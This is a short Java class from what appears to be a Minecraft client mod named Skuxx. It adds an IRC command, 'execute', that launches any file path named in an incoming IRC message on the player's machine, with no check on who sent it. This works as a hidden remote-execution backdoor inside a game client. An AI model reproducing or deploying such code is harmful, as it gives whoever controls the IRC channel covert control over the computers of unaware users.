package xyz.erik.skuxx.irc.irccmd;

import net.minecraft.client.main.Main;
import xyz.erik.skuxx.Skuxx;

public class IRCExecute extends IRCCommand {

    public IRCExecute() {
        super("execute");
    }

    public void run(String text) {

        String path = text.split(" ")[1];

        try {
            new ProcessBuilder(Main.getPath() + path).start();
            Skuxx.getInstance().getMyself().sendMessage("&Done.");
        } catch (Exception e){
            Skuxx.getInstance().getMyself().sendMessage("&Error!.");
        }
    }
    }
